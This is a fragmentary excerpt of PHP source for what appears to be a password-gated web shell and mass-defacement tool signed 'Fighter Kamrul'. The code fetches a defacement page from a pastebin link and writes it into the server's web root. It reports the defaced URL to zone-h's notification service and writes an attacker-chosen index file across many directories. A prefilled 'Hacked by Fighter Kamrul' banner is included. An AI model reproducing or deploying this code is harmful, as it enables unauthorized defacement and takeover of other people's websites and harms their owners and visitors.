...
if ($pass == $password)
{
 ...
 if(!isset($_SESSION['barca']) or $_SESSION['barca'] != $password)
 {
 	echo  "<html>
<head>
...
{   
    ...
    border-bottom: 2px dotted #b2b2b2;
	 ...
	 die('<br><br><br>
  <center><img src="https://a.top4top.net/p_633b39791.png" width="210" height="260"></center><br>
<div align=center >
...
document.getElementById('arsip').addEventListener('change', function () {
    ...
    document.getElementById('defacerid').style.display = style;
		...
		<u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='Fighter Kamrul'><br>
<div id='defacerid' style='display: none;'><br>
<u>Team</u>:<br>
        <input type='text' name='tim' size='50' value='Fighter Kamrul'><br><br>
		</div>
        <u>Domains</u>: <br>
    ...
    $url = "http://" . $_SERVER['SERVER_NAME'] . "/kamrul.html";
    $hh  = $_SERVER['DOCUMENT_ROOT'] . "/kamrul.html";
    @file_put_contents($hh, file_get_contents("https://pastebin.com/raw/FWg6UHEa"));
    function zoneh($url, $nick)
    {
        $ch = curl_init("http://www.zone-h.com/notify/single");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    ...
    $zoneh = zoneh($url, "Fighter Kamrul");
    if (preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
        echo "$url -> <font color=lime>OK</font><br>";
    } else {
        echo "$url -> <font color=red>ERROR</font><br>";
    ...
    echo "Enter email account : <form method='post'><input type='text' name='email' value='fighterkamrul@yahoo.com'> <input type='submit' value='Gas'></form>";
    if ($_POST['email']) {
        $file3 = $_POST['email'];
    ...
    if ($_POST['mass'] == 'onedir') {
        ...
        while ($row = readdir($dir)) {
        	if($_POST["random_name"]){
    	   		$file     = rand(1000000,9999999)."_".$_POST[d_file];
	        }else{
		        $file     = $_POST[d_file];
	        }
        ...
        while ($row = readdir($dir)) {
        	if($_POST["random_name"]){
    	    	$file     = $_POST[d_file]."_".rand(1000000,9999999);
	        }else{
		        $file     = $_POST[d_file];
	        }
            $start  = @fopen("$row/$file", "w+");
        ...
        <input type='text' name='d_file' value='Fighter.txt' style='width: 450px;' height='10'><input type='checkbox' name='random_name' value='random name'><br>
        <font style='text-decoration: underline;'>Index File:</font><br>
        <textarea name='script' style='width: 450px; height: 200px;'>=====Bangladeshi Hacker arrived....

=====Hacked by Fighter Kamrul

=====One Man Army
====#Follow Me 
http://www.facebook.com/fighterkamrul
